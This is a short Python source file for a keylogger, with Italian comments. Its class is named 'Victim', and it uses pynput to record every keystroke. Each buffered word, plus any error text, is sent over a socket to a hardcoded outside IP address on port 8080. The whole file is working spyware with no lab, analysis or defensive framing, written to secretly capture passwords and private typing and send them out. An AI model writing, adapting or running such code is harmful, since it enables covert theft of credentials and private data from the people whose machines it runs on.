import subprocess
import socket
from pynput import keyboard
YOUR_IP = "109.119.229.213"
class Victim():
    def __init__(self):
        
        self.w = ""
        self.s = socket.socket()

    def conn(self):
        self.s.connect((YOUR_IP, 8080))

    def on_press(self, key):
        # tasti lettera / numero
        try:
            if isinstance(key, keyboard.KeyCode):
                self.w += key.char
            # tasti speciali
            elif isinstance(key, keyboard.Key):
                if key == keyboard.Key.space:
                    # invio bufferdd
                    self.s.send(self.w.encode())
                
                    print(self.w)
                    self.w = ""
                else:
                    self.w += f"[{key.name}]"
        except Exception as e: 
            try: 
                self.s.send(e.encode())
            except: pass
    def start(self):

        with keyboard.Listener(on_press=self.on_press) as listener: 
            listener.join()

            
if __name__ == "__main__":
    app = Victim()
    app.conn()
    app.start()
    app.s.close()
